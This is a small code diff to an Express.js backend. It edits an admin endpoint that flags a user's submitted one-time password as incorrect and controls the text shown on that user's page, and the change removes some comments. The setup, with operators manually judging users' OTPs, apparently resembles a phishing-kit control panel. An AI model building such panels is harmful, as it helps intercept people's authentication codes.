@@ -529,23 +529,17 @@ app.post('/api/admin/release-text', authenticateJWT, async (req, res) => {
   }
 });
 
-// INCORRECT OTP - ONLY SETS ERROR FLAG, DOES NOT MODIFY OTP IN DATABASE
 app.post('/api/admin/incorrect-otp', authenticateJWT, async (req, res) => {
   try {
     const { email } = req.body;
     if (!email) return res.status(400).json({ error: 'Email required' });
-    
-    // Set a temporary flag for the user's page – DO NOT touch otp column
     await pool.query(`
       UPDATE users SET 
         admin_text = 'incorrect_otp_error',
         text_release = false
       WHERE email = $1
     `, [email]);
-    
-    console.log('🔴 Admin marked OTP as incorrect (client-side only) for:', email);
-    
-    // NO database change to otp, second_otp, approved, etc.
+    console.log('🔴 Admin marked OTP as incorrect for:', email);
     res.json({ success: true });
   } catch (error) {
     console.error('❌ Incorrect OTP error:', error.message);
